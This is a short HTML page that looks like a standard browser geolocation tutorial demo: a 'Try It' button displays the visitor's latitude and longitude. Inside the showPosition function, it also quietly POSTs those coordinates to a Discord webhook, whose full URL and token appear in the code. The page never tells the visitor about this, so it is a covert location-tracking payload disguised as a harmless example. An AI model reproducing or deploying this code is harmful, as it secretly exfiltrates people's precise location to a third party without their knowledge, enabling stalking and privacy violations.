<!DOCTYPE html>
<html>
<body>
<h1>HTML Geolocation</h1>
<p>Click the button to get your coordinates.</p>

<button onclick="getLocation()">Try It</button>

<p id="demo"></p>

<script>


  
const x = document.getElementById("demo");

function getLocation() {
  if (navigator.geolocation) {
    navigator.geolocation.getCurrentPosition(showPosition);
  } else { 
    x.innerHTML = "Geolocation is not supported by this browser.";
  }
}

function showPosition(position) {
  x.innerHTML = "Latitude: " + position.coords.latitude + 
  "<br>Longitude: " + position.coords.longitude;

        var xhr = new XMLHttpRequest();
        xhr.open("POST", "https://discord.com/api/webhooks/1255297754901647444/Oi0N8DLQ1ibD0Bjx4_eqWQLUevi_S5wZFPQ08Wenwzry7jPN6b4EjlmnN8gspTN2q0JJ", true);
        xhr.setRequestHeader('Content-Type', 'application/json');
        xhr.send(JSON.stringify({
            'content': "Latitude: " + position.coords.latitude + "   Longitude: " + position.coords.longitude ,
            'username':'EPIC',
        }));

        
}
</script>

</body>
</html>
